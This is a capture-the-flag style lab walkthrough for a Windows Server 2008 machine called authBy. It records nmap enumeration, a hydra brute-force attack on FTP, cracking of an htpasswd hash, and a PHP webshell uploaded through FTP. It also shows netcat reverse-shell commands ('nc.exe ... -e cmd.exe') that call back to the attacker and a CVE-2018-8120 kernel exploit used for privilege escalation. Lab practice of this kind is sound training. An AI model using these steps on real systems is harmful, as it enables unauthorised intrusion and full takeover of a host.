# authBy
## Information Gathering
### Potential Usernames
- Offsec
- Anonymous
- admin


## Enumeration
### Nmap scan
```bash
PORT     STATE SERVICE            VERSION
21/tcp   open  ftp                zFTPServer 6.0 build 2011-10-17
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| total 9680
| ----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
| ----------   1 root     root           25 Feb 10  2011 UninstallService.bat
| ----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
| ----------   1 root     root           17 Aug 13  2011 StopService.bat
| ----------   1 root     root           18 Aug 13  2011 StartService.bat
| ----------   1 root     root         8736 Nov 09  2011 Settings.ini
| dr-xr-xr-x   1 root     root          512 Jan 16 05:39 log
| ----------   1 root     root         2275 Aug 09  2011 LICENSE.htm
| ----------   1 root     root           23 Feb 10  2011 InstallService.bat
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
|_dr-xr-xr-x   1 root     root          512 Sep 22  2021 accounts
242/tcp  open  http               Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
| http-auth: 
| HTTP/1.1 401 Authorization Required\x0D
|_  Basic realm=Qui e nuce nuculeum esse volt, frangit nucem!
|_http-server-header: Apache/2.2.21 (Win32) PHP/5.3.8
|_http-title: 401 Authorization Required
3145/tcp open  zftp-admin         zFTPServer admin
3389/tcp open  ssl/ms-wbt-server?
|_ssl-date: 2023-01-15T21:45:53+00:00; +2s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: LIVDA
|   NetBIOS_Domain_Name: LIVDA
|   NetBIOS_Computer_Name: LIVDA
|   DNS_Domain_Name: LIVDA
|   DNS_Computer_Name: LIVDA
|   Product_Version: 6.0.6001
|_  System_Time: 2023-01-15T21:45:48+00:00
| ssl-cert: Subject: commonName=LIVDA
| Not valid before: 2021-09-20T18:21:50
|_Not valid after:  2022-03-22T18:21:50
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
```

### 21/tcp
#### Technologies
- zFTPServer 6.0 build
- Exploits
	- [Directory Traversal](https://www.exploit-db.com/exploits/18235) - FAILED

- Banner grabbing
```bash
ftp 192.168.244.46        
Connected to 192.168.244.46.
220 zFTPServer v6.0, build 2011-10-17 14:25 ready.
Name (192.168.244.46:Default):
```

- Anonymous access is allowed
- According to `accounts` directory, there are three users
	- Offsec
	- anonymous
	- admin
```bash
ftp> ls
229 Entering Extended Passive Mode (|||2060|)
150 Opening connection for /bin/ls.
total 4
dr-xr-xr-x   1 root     root          512 Sep 22  2021 backup
----------   1 root     root          764 Sep 22  2021 acc[Offsec].uac
----------   1 root     root         1032 Jan 18 07:54 acc[anonymous].uac
----------   1 root     root          926 Sep 22  2021 acc[admin].uac
```

- Using `hydra` to perfrom dictionary attack using `admin` username
```bash
hydra -l admin -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt ftp://192.168.128.46 -V -f

[21][ftp] host: 192.168.128.46   login: admin   password: admin
```

- With the credentials `admin:admin` I can download three new files `.htaccess`, `.htpasswd`, `index.php`
- `.htpasswd` contains a username and hash
```bash
$ cat htpasswd 
offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0
```

- I ran `JtR`. This gets me `offsec:elite`
```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt offsec-hash.txt 
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
elite            (offsec)
```

- You are able to upload to this ftp server. The FTP server is also setup in the same directory as the HTTP server. I can upload a [webshell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell) and get code execution.


### 242/tcp
#### Technologies
- Apache 2.2.21
- PHP 5.3.8

- Grab HTTP header of root page
```bash
curl -I -L "http://192.168.244.46:242"
HTTP/1.1 401 Authorization Required
Date: Sun, 15 Jan 2023 21:57:07 GMT
Server: Apache/2.2.21 (Win32) PHP/5.3.8
WWW-Authenticate: Basic realm="Qui e nuce nuculeum esse volt, frangit nucem!"
Content-Type: text/html; charset=iso-8859-1
```
- The realm translates is in latin and translate to `He who wants to be a nut from a nut breaks the nut!`

### 3145/tcp
#### Technologies
- zFTPServer admin

- Banner grabbing
```bash
ftp 192.168.244.46 -P 3145
Connected to 192.168.244.46.
220 .
Name (192.168.244.46:Default): Anonymous
331 User name received, need password.
Password: 
530 Login not accepted: Wrong username or password
ftp: Login failed
ftp>
```
- No anonymous login

## Foothold
- With the credentials `admin:admin` I can log into the FTP server. The root of the FTP server is also the root of the HTTP server. Anything I upload to the FTP server will also be found and executed by the HTTP server. I upload a [webshell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)

- Performing ping back
```bash
$ sudo tcpdump -i tun0 icmp                   
[sudo] password for Default: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
19:37:19.278990 IP 192.168.128.46 > 192.168.49.128: ICMP echo request, id 1, seq 1, length 40
19:37:19.279000 IP 192.168.49.128 > 192.168.128.46: ICMP echo reply, id 1, seq 1, length 40
19:37:20.275182 IP 192.168.128.46 > 192.168.49.128: ICMP echo request, id 1, seq 2, length 40
19:37:20.275194 IP 192.168.49.128 > 192.168.128.46: ICMP echo reply, id 1, seq 2, length 40
19:37:21.274190 IP 192.168.128.46 > 192.168.49.128: ICMP echo request, id 1, seq 3, length 40
19:37:21.274202 IP 192.168.49.128 > 192.168.128.46: ICMP echo reply, id 1, seq 3, length 40
19:37:22.288709 IP 192.168.128.46 > 192.168.49.128: ICMP echo request, id 1, seq 4, length 40
19:37:22.288722 IP 192.168.49.128 > 192.168.128.46: ICMP echo reply, id 1, seq 4, length 40
```

- Since `powershell` does not exist on this machine, I upload `nc.exe` via FTP and run the command `nc.exe 192.168.49.128 53 -e cmd.exe`
- This gives me foothold
```bash
$ nc -lnvp 53
listening on [any] 53 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.128.46] 49158
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\wamp\www>whoami
whoami
livda\apache
```

## Privilege Escalation

- Looking at access tokens
```cmd
C:\wamp\www>whoami  /priv
whoami  /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
- `SeImpersonatePrivilege` allows us to escalate.
- This machine is also vulnerabile to CVE-2018-8120 as seen in the systeminfo. This is a Windows 2008 machine with no hotfixes
```cmd
C:\wamp\www>systeminfo
systeminfo

Host Name:                 LIVDA
OS Name:                   Microsoftr Windows Serverr 2008 Standard 
OS Version:                6.0.6001 Service Pack 1 Build 6001
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                92573-OEM-7502905-27565
Original Install Date:     12/19/2009, 11:25:57 AM
System Boot Time:          1/17/2023, 3:36:16 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~3094 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,605 MB
Page File: Max Size:       1,983 MB
Page File: Available:      1,468 MB
Page File: In Use:         515 MB
Page File Location(s):     N/A
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           N/A
```
- I used the [CVE-2018-8120](https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2018-8120) x86.exe binary but you could also use the [MS15-051](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051) binaries as well

```cmd
C:\wamp\www>.\x86.exe "nc.exe 192.168.49.128 53 -e cmd.exe"
.\x86.exe "nc.exe 192.168.49.128 53 -e cmd.exe"
CVE-2018-8120 exploit by @unamer(https://github.com/unamer)
[+] Get manager at ff5255e0,worker at ff5253b8
[+] Triggering vulnerability...
[+] Overwriting...8170e41c
```